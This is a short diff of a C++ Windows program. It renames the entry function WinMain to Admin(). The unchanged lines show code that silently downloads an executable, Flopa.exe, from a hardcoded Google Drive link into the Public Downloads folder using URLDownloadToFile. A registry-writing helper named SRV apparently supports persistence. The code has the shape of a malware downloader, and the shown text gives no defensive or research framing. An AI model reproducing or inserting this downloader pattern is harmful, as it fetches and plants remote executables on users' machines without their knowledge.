@@ -1,4 +1,4 @@
-﻿#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "urlmon.lib")
 #include <Windows.h>
 #include <string>
 using namespace std;
@@ -32,7 +32,7 @@ void SRV(HKEY key, wstring path, wstring name, wstring value)
 	}
 }
 
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
+int Admin() {
 	const wchar_t* dwnld_URL = L"https://drive.google.com/uc?export=download&id=1eCpxk6SkIG6MCmOLgPt_nkgjaw698b7Z";
 	const wchar_t* savepath = L"C:\\Users\\Public\\Downloads\\Flopa.exe";
 	URLDownloadToFile(NULL, dwnld_URL, savepath, 0, NULL);
